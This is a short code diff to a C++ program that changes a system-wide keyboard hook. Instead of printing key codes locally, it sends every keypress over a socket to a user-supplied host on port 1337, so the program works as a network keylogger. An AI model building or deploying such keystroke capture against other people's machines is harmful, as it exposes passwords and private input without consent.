@@ -11,17 +11,20 @@
     #define os 1 // macos
 #endif
 
+EasySocket easy_socket; EasyEvent easy_event;
+SOCKET ConnectSocket;
+
 void KeydownCallback(int keyCode) {
-    std::cout << "Down " << keyCode << '\n';
+    char buff[20];
+    snprintf(buff, sizeof(buff), "Press %d\n", keyCode);
+    easy_socket.SendData(ConnectSocket, buff, sizeof(buff));
 }
 
 void KeyupCallback(int keyCode) {
-    std::cout << "Up " << keyCode << '\n';
+    // std::cout << "Up " << keyCode << '\n';
 }
 
 int main() {
-    EasySocket easy_socket;
-    EasyEvent easy_event;
     char port[] = "1337";
     int input;
     printf("input = ");
@@ -33,17 +36,11 @@ int main() {
         char host[256];
         printf("host = ");
         scanf("%s", host);
-        SOCKET ConnectSocket = easy_socket.ConnectTo(host, port);
+        ConnectSocket = easy_socket.ConnectTo(host, port);
         if (!ConnectSocket) return 0;
-        // char buff[256];
-        // for (int i = 0; i < 100; i++) {
-        //     snprintf(buff, sizeof(buff), "Heartbeat %d\n", i);
-        //     easy_socket.SendData(ConnectSocket, buff, sizeof(buff));
-        //     sleep(1);
-        // }
-        easy_event.StartHook();
         easy_event.setKeydownCallback(KeydownCallback);
         easy_event.setKeyupCallback(KeyupCallback);
+        easy_event.StartHook();
         while (true) {
             easy_event.MsgLoop();
         }
